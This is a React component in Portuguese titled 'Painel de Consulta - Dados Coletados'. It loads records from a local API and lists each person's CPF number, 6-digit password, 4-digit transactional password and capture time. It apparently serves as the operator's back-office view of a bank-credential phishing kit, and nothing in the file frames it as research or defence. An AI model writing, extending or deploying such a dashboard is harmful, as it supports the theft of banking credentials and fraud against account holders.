import React, { useState, useEffect } from 'react'
import './Painel.css'

function Painel() {
  const [dados, setDados] = useState([])
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    carregarDados()
  }, [])

  const carregarDados = async () => {
    try {
      const response = await fetch('http://localhost:3001/api/dados')
      const dadosCarregados = await response.json()
      setDados(dadosCarregados.reverse())
      setLoading(false)
    } catch (error) {
      console.error('Erro ao carregar dados:', error)
      setLoading(false)
    }
  }

  const totalRegistros = dados.length

  return (
    <div className="painel-container">
      <div className="container">
        <h1>Painel de Consulta - Dados Coletados</h1>
        
        <button className="refresh-btn" onClick={carregarDados}>
          🔄 Atualizar
        </button>

        <div className="stats">
          <div className="stat-card">
            <h3>Total de Registros</h3>
            <div className="value">{totalRegistros}</div>
          </div>
        </div>

        {loading ? (
          <div className="empty-state">
            <p>Carregando...</p>
          </div>
        ) : totalRegistros > 0 ? (
          <div className="table-container">
            <table>
              <thead>
                <tr>
                  <th>#</th>
                  <th>CPF</th>
                  <th>Senha (6 dígitos)</th>
                  <th>Senha Transacional (4 dígitos)</th>
                  <th>Data e Hora</th>
                </tr>
              </thead>
              <tbody>
                {dados.map((registro, index) => (
                  <tr key={index}>
                    <td>{index + 1}</td>
                    <td className="cpf">{registro.cpf}</td>
                    <td>
                      <span className="senha">{registro.senha6}</span>
                    </td>
                    <td>
                      <span className="senha">{registro.senha4}</span>
                    </td>
                    <td className="data-hora">{registro.data_hora}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        ) : (
          <div className="empty-state">
            <p>Nenhum registro encontrado.</p>
          </div>
        )}
      </div>
    </div>
  )
}

export default Painel

